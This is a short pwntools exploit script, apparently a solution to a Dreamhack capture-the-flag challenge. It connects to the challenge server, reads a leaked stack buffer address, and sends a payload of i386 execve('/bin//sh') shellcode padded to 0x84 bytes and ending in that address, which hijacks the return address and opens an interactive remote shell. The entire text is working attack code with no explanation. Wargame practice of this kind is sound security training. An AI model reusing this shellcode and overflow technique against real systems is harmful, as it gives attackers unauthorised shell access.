from pwn import *

p = remote("host3.dreamhack.games",13603)

context.arch = "i386"
sh = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

p.recvuntil(b"buf = (")
buf = int(p.recvline()[:-2], 16)

payload = sh.ljust(0x84, b"a") + p32(buf)

p.sendline(payload)

p.interactive()
